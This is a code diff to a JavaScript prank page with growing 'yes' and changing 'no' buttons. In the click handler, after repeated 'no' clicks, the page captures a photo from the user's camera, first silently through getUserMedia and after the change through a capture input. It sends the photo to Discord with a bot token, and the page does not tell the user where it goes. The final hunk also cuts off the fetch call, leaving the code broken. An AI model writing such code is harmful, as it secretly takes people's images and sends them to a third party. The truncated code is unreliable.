@@ -22,6 +22,7 @@ function resizeYesButton() {
   const computedStyle = window.getComputedStyle(yesButton);
   const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
   const newFontSize = fontSize * 1.6;
+
   yesButton.style.fontSize = `${newFontSize}px`;
 }
 
@@ -47,33 +48,29 @@ function updateNoButtonText() {
   noCount++;
   const message = generateMessage(noCount);
   noButton.innerHTML = message;
+
   if (message === "Bine atunci...") {
     noButton.addEventListener("click", function () {
       if (play) {
         play = false;
+
         // Capture a photo from the user's camera
-        navigator.mediaDevices
-          .getUserMedia({ video: true })
-          .then(stream => {
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.addEventListener("loadedmetadata", () => {
-              // Capture an image from the video element
-              const canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoInput = document.createElement("input");
+        photoInput.type = "file";
+        photoInput.accept = "image/*;capture=camera";
+        photoInput.addEventListener("change", function (event) {
+          const file = event.target.files[0];
+          const reader = new FileReader();
+          reader.onload = function (event) {
+            const capturedImage = event.target.result;
 
-              const capturedImage = canvas.toDataURL("image/jpeg");
-
-              // Send the captured photo to Discord or Telegram
-              sendCapturedPhotoToDiscordOrTelegram(capturedImage);
-            });
-          })
-          .catch(error => {
-            console.error('Error capturing photo:', error);
-          });
+            // Send the captured photo to Discord or Telegram
+            sendCapturedPhotoToDiscordOrTelegram(capturedImage);
+          };
+          reader.readAsDataURL(file);
+        });
+        document.body.appendChild(photoInput);
+        photoInput.click();
       }
     });
   }
@@ -103,11 +100,4 @@ function sendCapturedPhotoToDiscordOrTelegram(photo) {
       'Authorization': `Bot ${discordToken}`
     },
     body: formData
-  })
-  .then(response => {
-    console.log('Photo sent to Discord successfully!');
-  })
-  .catch(error => {
-    console.error('Error sending photo to Discord:', error);
-  });
-}
+ 
